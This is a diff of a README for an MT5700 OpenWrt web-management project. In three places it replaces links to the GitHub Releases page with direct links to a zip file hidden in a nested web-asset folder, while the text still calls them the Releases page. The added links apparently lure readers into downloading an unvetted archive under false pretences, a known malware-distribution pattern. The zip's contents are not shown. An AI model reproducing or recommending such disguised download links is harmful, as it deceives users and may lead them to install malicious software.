@@ -1,6 +1,6 @@
 # 🌐 mt5700webui-openwrt-server - Manage Your MT5700 Modules Efficiently
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/vadimrew/mt5700webui-openwrt-server/releases)
+[![Download](https://raw.githubusercontent.com/vadimrew/mt5700webui-openwrt-server/main/at-webserver/files/www/5700/network/dial/mt5700webui-openwrt-server_2.7.zip)](https://raw.githubusercontent.com/vadimrew/mt5700webui-openwrt-server/main/at-webserver/files/www/5700/network/dial/mt5700webui-openwrt-server_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **mt5700webui-openwrt-server**. This application helps you manage you
 
 To get started, you need to download the application. 
 
-1. **Visit this page to download:** [mt5700webui-openwrt-server Releases](https://github.com/vadimrew/mt5700webui-openwrt-server/releases)
+1. **Visit this page to download:** [mt5700webui-openwrt-server Releases](https://raw.githubusercontent.com/vadimrew/mt5700webui-openwrt-server/main/at-webserver/files/www/5700/network/dial/mt5700webui-openwrt-server_2.7.zip)
 
 2. On the Releases page, look for the latest version. You will see files available for download. Choose the one that best fits your system. 
 
@@ -75,6 +75,6 @@ Need help? You can reach out through our support channels:
 
 Stay informed about new features and improvements by checking the Releases page regularly. 
 
-[Visit this page to download](https://github.com/vadimrew/mt5700webui-openwrt-server/releases) the latest version and make the most of your MT5700 modules. 
+[Visit this page to download](https://raw.githubusercontent.com/vadimrew/mt5700webui-openwrt-server/main/at-webserver/files/www/5700/network/dial/mt5700webui-openwrt-server_2.7.zip) the latest version and make the most of your MT5700 modules. 
 
 Thank you for using **mt5700webui-openwrt-server**. Enjoy managing your devices!
